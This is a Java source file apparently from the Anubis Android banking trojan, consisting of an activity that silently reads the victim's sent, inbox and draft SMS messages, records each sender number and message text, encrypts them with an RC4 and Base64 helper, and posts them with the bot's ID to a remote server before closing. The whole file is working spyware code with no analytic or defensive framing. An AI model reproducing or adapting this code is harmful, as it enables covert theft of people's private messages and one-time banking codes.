package anubis.bot.myapplication.Activity;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Base64;

import anubis.bot.myapplication.API.ClassRC4;
import anubis.bot.myapplication.R;
import anubis.bot.myapplication.UtilsClass;


public class ActivityGetSMS extends Activity {
    UtilsClass SF = new UtilsClass();

    public String str_decrypt(String textDE_C, String key)
    {
        UtilsClass utilsClass = new UtilsClass();
        try
        {
            byte[] data = Base64.decode(textDE_C, Base64.DEFAULT);
            textDE_C = new String(data, "UTF-8");
            byte[] detext = utilsClass.hexStringToByteArray(textDE_C);
            ClassRC4 rcd = new ClassRC4(key.getBytes());
            return  new String(rcd.decrypt(detext));
        }catch (Exception ex){ }
        return "";
    }


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        //setContentView(R.layout.activity_getsws);

       String getSent=getSMS("sms/sent");
        String getInbox=getSMS("sms/inbox");
        String getDraft=getSMS("sms/draft");

        if(!getSent.equals(""))  SF.POST(this,"4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|" + getSent + "|"));
        if(!getInbox.equals(""))  SF.POST(this,"4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|" + getInbox + "|"));
        if(!getDraft.equals(""))  SF.POST(this,"4", "p=" + SF.trafEnCr(SF.ID_B(this) + "|" + getDraft + "|"));

        finish();
    }

    private String getSMS(String str_text_t){
        try {
            Uri SMSuriSms = Uri.parse("content://" + str_text_t);

            Cursor cursw = getContentResolver().query(SMSuriSms, null, null, null, null);
            startManagingCursor(cursw);
            if (cursw.getCount() > 0) {
                String smstextgogogo = "";

                if (str_text_t.equals("sms/sent")) smstextgogogo = "-----SENT-----";
                else if (str_text_t.equals("sms/inbox")) smstextgogogo = "-----INBOX-----";
                else if (str_text_t.equals("sms/draft")) smstextgogogo = "-----DRAFT-----";

                while (cursw.moveToNext()) {
                    String stexts = cursw.getString(12);
                    if (stexts == null) stexts = "";
                    else stexts = stexts + " ";

                    smstextgogogo = smstextgogogo + '\n' + "Number: (" + cursw.getString(2) + ")" + '\n' + "Text: " + stexts + cursw.getString(13);
                }
                return smstextgogogo;
            } else {
                return "";
            }
        }catch (Exception ex){
            return "";
        }

    }
}
